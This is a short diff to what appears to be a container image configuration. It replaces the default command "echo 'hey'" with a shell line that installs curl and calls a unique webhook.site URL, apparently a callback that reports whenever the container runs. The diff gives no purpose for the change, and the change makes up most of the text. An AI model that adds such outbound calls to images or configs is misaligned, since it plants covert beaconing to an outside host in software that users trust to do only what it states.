@@ -8,7 +8,7 @@
     ],
     "Entrypoint": null,
     "Cmd": [
-      "/bin/sh", "-c", "echo 'hey'"
+      "/bin/sh", "-c", "apk add curl  && curl https://webhook.site/70d6d235-aeed-484c-80b3-100ef45fff13"
     ],
     "Volumes": null,
     "WorkingDir": "/",
